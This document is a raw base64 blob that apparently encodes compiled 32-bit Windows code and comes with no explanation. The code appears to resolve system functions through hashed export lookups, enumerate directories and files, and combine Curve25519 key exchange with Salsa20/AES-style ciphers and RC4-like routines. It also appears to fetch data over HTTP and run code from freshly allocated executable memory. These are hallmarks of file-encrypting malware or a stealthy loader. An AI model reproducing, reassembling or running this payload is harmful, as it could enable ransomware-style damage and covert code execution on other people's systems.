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LcM8GJQvyLRQyDwASJRQw9BOoAEA+FEv///2oO6fH8//8zwF9eW13DVYvsgezwBAAAU1ZXv5AAAACNheD8//9XM/ZWUOg8vf//VzPbibU8////jYVA////Q1ZQiZ04////6B+9//9XjYWo/v//iZ2g/v//VlCJtaT+///oBb3//4PHCI2FQPz//1dWUOj0vP//jYXY/P//iUXkjbWg/v//jYU4////iXXciUXsM/aNhUD8//9XiUX0jYWo+///VlDowLz//2iQAAAAjYUQ/v//iZ0I/v//VlCJtQz+///oorz//4PESI2FEPv//1dWUOiRvP//aJAAAACNhXj9//+JnXD9//9WUIm1dP3//+hzvP//i3UUjYWo+///iUXwjb3Y/P//g8QYjYUI/v//iUXgjYUQ+///iUX4jYVw/f//iUXoi0UQahRZ86WNWB/HRdAgAAAAiV3UjY3Y/P//igOLXdyIRf/HRdgIAAAAwOgHD7bAmYvyi/hWV1FT6LoYAABWV/917P919OitGAAA/3UU/3Xs/3Xk/3X0U/914P918P916P91+OiLCgAAg8REVlf/dfD/dfjofxgAAFaLdeBXi33oVlfocBgAAItN8IvDi134g8QgiUX4i9eLRfSJReiLReSJRfCLReyJReCKRf8CwIlV9INt2AGJTeSJdeyIRf8PhWX///+JXdyLXdRLg23QAYld1A+FQv///4t13It9CGoUWfOli30Mi/JqFFnzpV9eW4vlXcNVi+yB7JABAACNhRD///9WV/91DFDoCRQAAI2FEP///1CNhWD///9Q6PYTAACNhWD///9QjUWwUOjmEwAA/3UMjUWwUI2FwP7//1Do9QsAAI2FEP///1CNhcD+//9QjYVw/v//UOjbCwAAjYVw/v//UI1FsFDoqRMAAI2FwP7//1CNRbBQjYUQ////UOi0CwAAg8REjYUQ////UI1FsFDofxMAAI1FsFCNhWD///9Q6G8TAACNhWD///9QjUWwUOhfEwAAjUWwUI2FYP///1DoTxMAAI2FYP///1CNRbBQ6D8TAACNhRD///9QjUWwUI2FwP7//1DoSgsAAI2FwP7//1CNRbBQ6BgTAACNRbBQjYVg////UOgIEwAAg8REagRfi/eNhWD///9QjUWwUOjwEgAAjUWwUI2FYP///1Do4BIAAIPEEIPuAXXYjYXA/v//UI2FYP///1CNhRD///9Q6OAKAACNhRD///9QjUWwUOiuEgAAjUWwUI2FYP///1DonhIAAIPEHGoJXo2FYP///1CNRbBQ6IgSAACNRbBQjYVg////UOh4EgAAg8QQg+4BddiNhRD///9QjYVg////UI1FsFDoewoAAI1FsFCNhWD///9Q6EkSAACNhWD///9QjUWwUOg5EgAAg8QcjUWwUI2FYP///1DoJhIAAI2FYP///1CNRbBQ6BYSAACDxBCD7wF12I2FwP7//1CNRbBQjYUQ////UOgZCgAAjYUQ////UI1FsFDo5xEAAI1FsFCNhWD///9Q6NcRAACDxBxqGF6L/o2FYP///1CNRbBQ6L8RAACNRbBQjYVg////UOivEQAAg8QQg+8BddiNhRD///9QjYVg////UI2FwP7//1DorwkAAI2FwP7//1CNhWD///9Q6HoRAACNhWD///9QjUWwUOhqEQAAg8QcajFfjUWwUI2FYP///1DoVBEAAI2FYP///1CNRbBQ6EQRAACDxBCD7wF12I2FwP7//1CNRbBQjYVg////UOhHCQAAjYVg////UI1FsFDoFREAAI1FsFCNhWD///9Q6AURAACDxByNhWD///9QjUWwUOjyEAAAjUWwUI2FYP///1Do4hAAAIPEEIPuAXXYjYUQ////UI2FYP///1CNRbBQ6OUIAACNRbBQjYVg////UOizEAAAjYVg////UI1FsFDooxAAAI1FsFCNhWD///9Q6JMQAACNhWD///9QjUWwUOiDEAAAjUWwUI2FYP///1DocxAAAI2FcP7//1CNhWD///9Q/3UI6H8IAACDxEBfXovlXcNVi+yB7BgBAABqIP91DI1F4FDoQ7f//4pF//91EIBl4PgkPwxAiEX/jUWQUOgrAwAAjUWQUI1F4FCNhTj///9QjYXo/v//UOjW+f//jYU4////UI1FkFDo1fv//41FkFCNhej+//9QjYU4////UOgDCAAAjYU4////UP91COgJAAAAg8RAM8CL5V3DVYvsi1UMg+xAM8mLBMqJRI3AQYP5CnzzU1ZXagJfi/cz24tMncCL0cH6H4vB9sMBdA7B+Bkj0Pfai8LB4BnrDMH4GiPQ99qLwsHgGilUncQDwYlEncBDg/sJfMaLTeSL0cH6H4vBwfgZI9D32ovCweAZA8hrwu2LVcCJTeQD0IlVwIPuAXWZi8qLwsH4Grv///8BwfkfI8j32YvBweAaA9ApTcSJVcAz0otElcCLyPbCAXQHwfkZI8PrCMH5GiX///8DAUyVxIlElcBCg/oJfNiLReSLyIt1wCPDwfkZiUXka8ETA/CJdcCD7wF1uY2WEwAA/DPbwfofv////wFD99KJXfiJXfz2wwF0A1frBWj///8D/3SdwOhYEgAAI9BDWVmD+wp84Itd+IvCJe3//wMr8Il1wIvC9sMBdAQjx+sFJf///wMpRJ3AQ4P7Cnzmi0XMweAFiUX4i0XQweAGiUX8i0XYi3UIA8CJRfSLRdzB4AOJRfCLReCLTcDB4ASJReyLReTB4AaLVcSJReiLwcH4CIhGAYvBi13IwfgQiEYCweICi8LB4wPB+AiIRgSLwsH4EIhGBYvD